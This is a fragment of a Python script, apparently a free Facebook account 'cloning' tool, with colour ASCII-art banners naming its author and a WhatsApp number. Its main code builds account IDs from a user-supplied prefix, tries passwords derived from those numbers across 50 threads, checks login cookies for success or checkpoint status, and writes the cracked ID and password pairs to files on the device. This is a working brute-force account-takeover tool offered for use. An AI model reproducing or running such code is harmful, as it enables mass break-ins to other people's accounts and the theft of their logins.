...
logo = \033[1;95m.######..##.....##.####.########..##.....##
        ...
        \033[1;96m ........##.##.....##..##..##.....##.##.....##
         ...
         \033[1;93m ..######..##.....##.####.########...######
          \033[1;95m ..######..##.....##.####.########...######
\x1b[1;97m------------------------\x1b[1;97m------------------------
\n\x1b[1;92m   ADMIN : \x1b[1;97mShibu  \x1b[1;95mTOOL:\x1b[1;97mFREE     \x1b[1;91mV:\x1b[1;97m1.4.0

         \x1b[1;92m  WHATSAPP: \x1b[1;95m+8801914436101
          \x1b[1;92m FACEBOOK:  \x1b[1;95mSk Shibu
\033[1;37m------------------------\033[1;37m------------------------ """
def ud():
...
logo = \033[1;95m.######..##.....##.####.########..##.....##
        ...
        \033[1;96m ........##.##.....##..##..##.....##.##.....##
         ...
         \033[1;93m ..######..##.....##.####.########...######
          \033[1;95m ..######..##.....##.####.########...######
\033[1;92m███████▒▒Welcome To Toxic▒▒████████
 
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mShibu\033[1;95m♡╭──────────•◈•──────────╮♡
 
\033[1;94mAuthor\033[1;91m: \033[1;91mSK Shibu
 
\033[1;94mShibu\033[1;91m: \033[1;91▒▓██████████████]99.9
 
\033[1;94mFacebook\033[1;91m: \033[1;91m Sk Shibu
 
\033[1;94mWhatsapp\033[1;91m: \033[1;91m+8801914436101
...
def i():
    ...
    code = input(' PUT CODE : ')
    print("")
    limit = int(input(' EXAMPLE: 1000, 2000, 30000, 400000,500000\n\n PUT CLONING LIMIT: '))
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\033[1;93m[~] \033[1;97mCloning Started Fire Now BaBY')
        print('\033[1;37m------------------------------------------------')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32m[Shibu-OK]  ' +cid+ ' | ' +ps+ '\033[1;32m'+  ' \n '+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/Shibu-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\33[1;35m[Shibu-CP]  ' +cid+ ' | ' +ps+      '  \33[0;97m')
                open('/sdcard/Shibu-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r %s[Shibu] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
